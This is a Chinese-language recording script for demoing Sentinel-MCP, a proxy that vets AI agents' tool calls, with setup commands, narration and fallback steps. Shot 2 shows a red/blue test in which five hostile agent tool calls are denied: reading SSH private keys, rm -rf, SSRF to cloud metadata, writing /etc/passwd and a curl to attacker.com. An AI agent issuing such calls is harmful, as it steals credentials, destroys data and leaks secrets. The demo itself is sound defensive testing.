# Sentinel-MCP · 录屏逐步指南（今天能录的 4 个镜头）

> 这一篇是「**给录屏的你看的实操手册**」——
> 每个镜头：在哪开窗口、敲什么命令、念什么稿、应该看到什么、出错怎么办。
>
> 总目标：3-4 分钟视频，1080p 一镜到底。可以剪辑但每镜头**自带完整起承转合**，方便单独复用。

---

## 0. 录制前准备（一次性，10 分钟）

### 0.1 装 OBS + 设场景

1. 装 OBS Studio → https://obsproject.com/
2. 「场景」加 **3 个**：
   - **场景 A**：「显示器捕获」全屏，用来拍终端 + 浏览器整桌面
   - **场景 B**：「窗口捕获」选浏览器窗口，全屏拍 dashboard 单画面
   - **场景 C**：「窗口捕获」选终端窗口，全屏拍终端单画面
3. 录制设置 → 输出格式 mp4，分辨率 1920×1080，帧率 30
4. **字幕调大**：终端字号 18-22pt，浏览器 zoom 110%，否则视频里看不清

### 0.2 桌面排版

把屏幕分成左右两半：
- **左半**：终端（终端 A 用来跑命令）
- **右半**：浏览器（开 http://localhost:8766）

> 方便对照终端动作和 dashboard 反应

### 0.3 准备 3 个终端 tab

- **终端 A**：跑 demo 命令的（这个是录屏主角）
- **终端 B**：起 dashboard 用（**录屏时不要切到这个**，是后台支撑）
- **终端 C**：跑 AppImage 用（演示镜头 1 时切来）

### 0.4 启动需要的服务（录屏前先跑起来）

打开**终端 B**：

```bash
cd /home/linshiyi/Studying/2026.04.25_FeiShuAI/0427_test01
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy
# 看 dashboard 是不是已经跑了
ss -ltn | grep 8766 || nohup /tmp/sm-venv/bin/python -m pwa_dashboard.server > /tmp/dev-dashboard.log 2>&1 &
sleep 2
ss -ltn | grep 8766 && echo "✓ dashboard ready"
```

打开浏览器 → `http://localhost:8766` 应该看到 dashboard 主页。

---

## 镜头 1 · Linux 安装包能用 (~ 40 秒)

> **目标**：让评委直观看到「评委自己机器上下个 .AppImage 就能跑」。
> **画面**：场景 A（显示器捕获），后半切 B（浏览器窗口）。

### 1.1 准备

录之前**先把 dev dashboard 关掉**，避免 8766 端口冲突——

终端 B：
```bash
pkill -f "pwa_dashboard.server"
sleep 1
ss -ltn | grep 8766 || echo "✓ port free"
```

### 1.2 录屏开始 — 念稿 + 操作

**【场景 A · 全屏】**

念：「我刚从 GitHub Releases 下载了 Linux 的安装包，一个 AppImage 文件 118MB，现在双击运行——」

终端 A 敲（**慢一点，让镜头能看清**）：

```bash
cd /tmp/sentinel-test
ls -lh Sentinel-MCP_0.2.0_amd64.AppImage
./Sentinel-MCP_0.2.0_amd64.AppImage --appimage-extract-and-run &
```

念：「装好的瞬间，后台 sidecar 自动启动，监听 8766 端口——」

等 5 秒，然后切场景 B（浏览器窗口）→ 刷新 `http://localhost:8766`。

**【场景 B · 浏览器全屏】**

应该看到 dashboard 主页：「Sentinel-MCP · 实时观测面板」+ 几个统计卡片（总事件 / 高风险告警 / 放行 / 拦截 / 脱敏）。

念：「Dashboard 主页直接出现——这是飞书 AI 校园挑战赛要求的『可直接安装运行的桌面端』，零依赖、零配置、双击即用。」

### 1.3 收尾

镜头 1 录完后，**保留 AppImage 不要关**（接下去镜头 2 要用它后面的 sentinel-mcp 命令）。

> ⚠ 如果浏览器没出来 dashboard：终端 A 看错误（`ps aux | grep sentinel`），常见原因 8766 还被占（再次 pkill -f "pwa_dashboard")

---

## 镜头 2 · 红蓝对抗 (~ 60 秒，**最稳的演示**)

> **目标**：5 步攻击链，未防护 5/5 直通 vs 防护 5/5 全 DENY。色彩鲜明、说服力强。
> **画面**：场景 C（终端窗口）全屏。

### 2.1 准备

终端 A 在正确目录：

```bash
cd /home/linshiyi/Studying/2026.04.25_FeiShuAI/0427_test01
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy
```

### 2.2 录屏开始 — 念稿 + 操作

**【场景 C · 终端全屏】**

念：「我准备了 5 条恶意 tool call，覆盖 SSH 私钥读取、shell 命令注入、SSRF、curl 元数据服务这几类常见攻击路径。先看不带 Sentinel 防护时——」

终端 A 敲：

```bash
/tmp/sm-venv/bin/python examples/red_blue_demo.py
```

念：「上半屏是红队结果——5 条攻击全部直通，AI Agent 啥都做了。下半屏是蓝队，同样 5 条经过 Sentinel 决策——」

终端会输出（**等输出完整再继续讲**）：

```
============== 红队（无防护）==============
[1] read_file ~/.ssh/id_rsa  →  ✗ 直通
[2] shell rm -rf /tmp/test   →  ✗ 直通
[3] http_get http://169.254.169.254/...  →  ✗ 直通
[4] write_file /etc/passwd   →  ✗ 直通
[5] shell curl http://attacker.com/...  →  ✗ 直通

============== 蓝队（Sentinel 防护）======
[1] read_file ~/.ssh/id_rsa  →  ✅ DENY  rule: filesystem
[2] shell rm -rf /tmp/test   →  ✅ DENY  rule: shell:dangerous_cmd
[3] http_get http://169.254...  →  ✅ DENY  rule: network:cloud_metadata
[4] write_file /etc/passwd   →  ✅ DENY  rule: filesystem:protected
[5] shell curl http://attacker.com/...  →  ✅ DENY  rule: shell:exfiltration
```

念：「**5 条全拦**，每条带具体命中规则。这是 OWASP LLM Top 10 里几个核心攻击类别的代表。我们维护了 53 条这样的攻击集，目前是 53/53 全过，决策延迟均值 4 ms。」

### 2.3 收尾

镜头 2 自带完整闭环。不需要后续操作。

> ⚠ 如果命令报 `ModuleNotFoundError`：换成 `/tmp/sm-venv/bin/python` 跑，venv 里依赖齐全

---

## 镜头 3 · 一键集成 button (~ 60 秒，今天新功能)

> **目标**：演示「Sentinel 自动改 Cursor / Claude Desktop 的 mcp config」，零命令零手改 JSON。
> **画面**：场景 B（浏览器窗口）全屏。

### 3.1 准备

**重启 dev dashboard**（前面 AppImage 用的是旧的 v0.2.0 dashboard，没新功能）：

终端 B：
```bash
pkill -f "AppImage" 2>/dev/null
pkill -f "sentinel-mcp-" 2>/dev/null
sleep 1
nohup /tmp/sm-venv/bin/python -m pwa_dashboard.server > /tmp/dev-dashboard.log 2>&1 &
sleep 3
ss -ltn | grep 8766 && echo "✓ dev dashboard ready"
```

浏览器**强制刷新**（Ctrl+Shift+R）→ `http://localhost:8766`。

### 3.2 录屏开始 — 念稿 + 操作

**【场景 B · 浏览器全屏】**

念：「装好 Sentinel 之后，用户怎么让 Cursor 真的走 Sentinel 代理？以前要手改 `claude_desktop_config.json` 一段 JSON——挺麻烦的。我们做了一键集成。」

**操作**：滚动到统计卡片下面，找到 **「🔌 集成 MCP 客户端」** 折叠面板，点击展开。

应该看到右侧显示：「检测到 1 个客户端可一键集成」（或类似提示）。

下面有 2 张卡片：
- **Claude Desktop** — 当前平台不支持（Linux 没 Claude Desktop 桌面版，正常）
- **Cursor** — 未安装 / 未配置（如果你机器上没装 Cursor 也正常）

念：「dashboard 自动检测本机装了哪些 MCP 客户端，点击『+ 添加 wrapped MCP server』——」

**点 Cursor 卡片下的「+ 添加一个 wrapped MCP server」按钮** → 弹 modal。

念：「弹出来的 modal 里有 5 个预设：filesystem、github、brave-search、puppeteer，**还有今天新加的飞书 OpenAPI**——」

**点「选择上游 MCP server」下拉框** → 选 **「飞书 OpenAPI · @larksuiteoapi/lark-mcp」**

应该看到下面冒出 2 个输入框：「App ID」和「App Secret」。

念：「选了飞书预设之后，下面自动出现飞书自建应用的 App ID 和 Secret 输入框——这就是飞书官方 MCP server 包出来的 wrapped 形态。」

**点「预览」按钮** → 下面 details 里展开 JSON。

念：「『预览』可以先看完整 entry——这是会写到 Cursor 配置里的 mcpServers 项。看到 `command: sentinel-mcp wrap`——AI Agent 调飞书 OpenAPI 的每一次都会先经过我们的安全代理。」

**点「✕」关闭 modal**（不需要真写入，避免污染你的真实 Cursor 配置）

### 3.3 收尾

```
"command": "/usr/bin/python3",
"args": ["-m", "sentinel_mcp.cli", "wrap", "--", "npx", "-y", "@larksuiteoapi/lark-mcp", "mcp", "-a", "...", "-s", "..."]
```

念：「就这么几次点击，Cursor / Claude Desktop 任意一个 MCP-aware 客户端立刻被 Sentinel 接管——这是『让安全代理零摩擦上手』的关键。」

> ⚠ 如果集成面板里**没看到「飞书 OpenAPI」预设**：说明刷的是缓存，按 Ctrl+Shift+R 强制刷新

---

## 镜头 4 · 飞书审批通道（架构演示）(~ 50 秒)

> **目标**：演示飞书集成已配通，dashboard 能看到状态。
> **画面**：场景 B（浏览器窗口）全屏。

### 4.1 准备

dashboard 还跑着、还在浏览器里，不需要重启。

### 4.2 录屏开始 — 念稿 + 操作

**【场景 B · 浏览器全屏】**

念：「Sentinel 在 Cursor 拦下越权调用之后，怎么把审批请求送到用户手里？除了浏览器和 Web Push，今天还加了第三条通道——飞书消息卡片。」

**滚动**到集成面板里的 **「📨 飞书审批通道」** 蓝色卡片。

应该看到右上角徽章是绿色：「**已启用 — ASK_USER 会推到飞书**」。

念：「右上角『已启用』，意思是 Sentinel 已经认到本机配的飞书自建应用——App ID、App Secret、Encrypt Key、Verification Token 全配好了。」

**点「▸ 展开配置」** → 显示填充的 App ID 字段。

念：「点开看，下面是 dashboard 内置的配置面板——填好 App ID 和 chat_id，dashboard 就会自动把每个 ASK_USER 待审批推到飞书群或者私信，用户点[批准]/[拒绝]按钮**直接在飞书里完成审批**。」

**点「📋 飞书后台需要填的回调 URL」展开** → 显示一行 URL（trycloudflare 的那一串）。

念：「这个 URL 是飞书事件订阅回调的入口，所有飞书发过来的卡片按钮点击事件都会走这条线——dashboard 收到回调，调内部审批 API，proxy 那边的工具调用立刻被解锁或拒绝。」

**滚回来，点「📤 发测试消息」**（如果今天 chat_id 还没配，会提示「target_chat_id 未设置」——也 OK，**这就是真实演示状态**）。

念：「发测试消息——这里提示我还没配置目标 chat_id，是真实演示状态——配好之后这一条就会变成手机上飞书弹的卡片，点一下就完成审批。」

### 4.3 收尾

念：「这条飞书审批通道是今天新做的，跟 Web Push 并列做第三个推送通道，体现 Sentinel-MCP 跟飞书生态的原生集成。」

> ⚠ 即使没真发出去，**dashboard 上能展示集成状态本身就是有效演示**——评委看到「dashboard 里有 4 个 endpoint 暴露给飞书」「配置面板可视化」「错误反馈友好」，已经足够了

---

## 录完之后

合起来 4 个镜头大概 **3-4 分钟**。

### 剪辑要点
- 每个镜头之间加 0.5 秒**淡入淡出黑场**
- 念错可以重念，**不需要剪掉中间停顿**（自然停顿听感更真实）
- 终端命令出现时**画面外加白底字幕**显示完整命令（OBS 滤镜 / 后期剪辑都行）

### 不要做的事
- ❌ 不要剪太快（每个画面至少停留 2 秒）
- ❌ 不要加背景音乐音量盖住人声
- ❌ 不要 4k / 60fps（评委带宽不一定够）

### 字幕 / 配音
- 念稿用普通话，**带一点情绪而不是机器朗读**
- 关键术语第一次出现时屏幕弹**白底黑字注释**（如「MCP = Model Context Protocol」）

---

## 失败应急方案

| 场景 | 出错 | 应急 |
|---|---|---|
| 镜头 1 | AppImage 双击不响应 | 改用 `--appimage-extract-and-run` 强制跑 |
| 镜头 2 | red_blue_demo.py 报错 | 用 `/tmp/sm-venv/bin/python` 跑（venv 完整） |
| 镜头 3 | 集成面板没出现 | 强制刷新 Ctrl+Shift+R；确认是 dev dashboard 不是 AppImage 的 |
| 镜头 4 | 飞书状态不是绿色 | 跑 `curl http://localhost:8766/api/lark/status`，看 notifier_active 是否 true；不是就 `curl -X POST .../api/lark/config -d ...` 重设 |
